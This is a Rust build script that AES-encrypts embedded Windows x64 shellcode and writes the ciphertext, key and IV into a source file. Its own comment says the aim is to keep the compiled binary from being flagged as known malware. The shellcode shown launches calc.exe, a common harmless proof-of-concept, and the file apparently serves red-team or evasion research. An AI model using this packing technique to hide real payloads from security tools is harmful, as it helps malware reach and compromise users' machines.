// This build script is used to turn unencrypted shellcode 
// to encrypted shellcode, so the binary wont have known malware

use std::fs;
use std::path::Path;
use libaes::Cipher;

const _KEY: &[u8; 32] = b"Godspeed You! Black Emperor00000";
const _IV: &[u8; 16] = b"examplexample...";


const DATA: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
    0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
    0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
    0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
    0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
    0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
    0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
    0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
    0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
    0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
    0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
    0x2e,0x65,0x78,0x65,0x00]; 


    
// This is not good code, but it works for this purpose and as it's just the build file, it's fine.
fn to_output_string(input: &[u8]) -> String {
    let mut result = String::new();
    result.push_str("[");
    for (i, &byte) in input.iter().enumerate() {
        result.push_str(&byte.to_string());
        if i < input.len() - 1 {
            result.push_str(", ");
        }
    }
    result.push_str("]");
    result
}

fn encrypt_shellcode(code: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8>{
    let cipher = Cipher::new_256(key);
    cipher.cbc_encrypt(iv, code)
}

fn main () { 
    let key: &[u8; 32] = _KEY;
    let iv = _IV;

    let shellcode_data = DATA.to_vec();
    let encrypted_payload = encrypt_shellcode(&shellcode_data, key, iv);

    let dest_path = Path::new("src").join("shellcode.rs");
    
    let iv_str = to_output_string(iv);
    let key_str = to_output_string(key);
    let encrypted_payload_str = to_output_string(&encrypted_payload);

    let file_content = format!(
        "
pub const INITVEC: [u8; 16] = {};
pub const KEY: [u8; 32] = {};
pub const SHELLCODE: &[u8] = &{};
        ",
        iv_str, key_str, encrypted_payload_str);

    fs::write(&dest_path, file_content).unwrap();

    println!("cargo:rerun-if-changed=build.rs");
}